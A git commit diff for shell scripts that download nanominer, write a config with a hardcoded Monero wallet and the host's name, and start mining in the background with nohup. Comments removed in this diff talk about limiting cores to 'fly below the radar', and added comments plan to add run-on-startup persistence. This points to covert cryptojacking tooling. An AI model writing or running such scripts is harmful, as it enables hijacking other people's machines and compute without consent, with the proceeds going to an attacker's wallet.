f30c05a5b8d8673614d32e2f4fe6d030e6b764d7
Frederick Nyawaya <o.frederickn@gmail.com>
2021-06-02 21:31:44 +0300

    added cleaner runs for unlimited miner

---
+++ calc_hash_rate.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+# CPU_THREADS=$(nproc)
+CPU_THREADS=120
+
+EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  exit 1
+fi
+
+echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
--- warp-unlimited.sh
+++ warp-unlimited.sh
@@ -1,22 +1,13 @@
 #!/bin/bash
-wget https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz
-tar -xf nanominer-linux-3.3.4.tar.xz
+wget https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz>dev/null
+tar -xf nanominer-linux-3.3.4.tar.xz>dev/null
 cd nanominer-linux-3.3.4
 
-#3 The default config uses max cores. To use one-less core in order to 'fly' below the radar?
-# Delete config.ini if present
-# load all info with this script
-# Append rig name as result of host name
-# Append number of cores as total - 1 
-# echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo`    
-# cat /proc/sys/kernel/hostname
-# grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'
-# echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'`
-
 # X-Mode - No limit on cpu threads
-# custom config
 touch config.ini
 rm config.ini
+
+echo "Configuring miner..."
 
 echo "[RandomX]" >> config.ini
 echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
@@ -24,4 +15,11 @@ echo "rigName = " `cat /proc/sys/kernel/hostname` >> config.ini
 echo "email = yokohama@mailinator.com" >> config.ini
 echo "sortPools = true" >> config.ini 
 
+# Some refinements needed:
+# Always check nanominer is not running before starting
+# Enable run on startup - with a service, in the background
+
+# Start as a background process
 nohup ./nanominer &
+
+echo "Setup complete, mining in progress"
